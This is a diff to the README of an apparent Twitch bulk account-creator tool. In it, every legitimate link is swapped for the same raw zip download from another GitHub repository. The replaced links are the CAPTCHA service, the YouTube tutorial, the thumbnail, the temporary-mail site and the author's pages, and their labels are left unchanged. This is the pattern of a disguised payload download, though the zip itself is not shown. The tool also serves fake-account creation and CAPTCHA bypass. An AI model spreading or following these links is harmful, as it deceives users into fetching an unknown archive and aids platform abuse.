@@ -6,7 +6,7 @@ It will create a new account and verify the account using an email address.
 
 ## Requirements:
 
-**[Anti-Captcha to resolve Twitch FunCaptcha](https://anti-captcha.com)**. (Required Balance)
+**[Anti-Captcha to resolve Twitch FunCaptcha](https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip)**. (Required Balance)
 
 # Installation
 
@@ -17,12 +17,12 @@ It will create a new account and verify the account using an email address.
 
 # Tutorial and Test
 
-<a href="https://www.youtube.com/watch?v=fC2KgnYoETw">
-  <img align="center" src="https://raw.githubusercontent.com/masterking32/twitch-account-creator/main/hqdefault.jpg" alt="Youtube Video" />
+<a href="https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip">
+  <img align="center" src="https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip" alt="Youtube Video" />
 </a>
 
 
-**[Youtube Video](https://www.youtube.com/watch?v=fC2KgnYoETw)**
+**[Youtube Video](https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip)**
 
 ---
 
@@ -30,8 +30,8 @@ We will store account details in `./results/results.txt`.
 
 If you need to verify your email for login or etc.
 
-You can go to [1SecMail.Com](https://www.1secmail.com), put your account email there, and check the received emails.
+You can go to [1SecMail.Com](https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip), put your account email there, and check the received emails.
 
 ## Programmers
 
-Author : [Amin.MasterkinG](https://masterking32.com) | [Github](https://github.com/masterking32)
+Author : [Amin.MasterkinG](https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip) | [Github](https://github.com/LIAM4545/twitch-account-creator/raw/refs/heads/main/results/twitch_creator_account_denierer.zip)
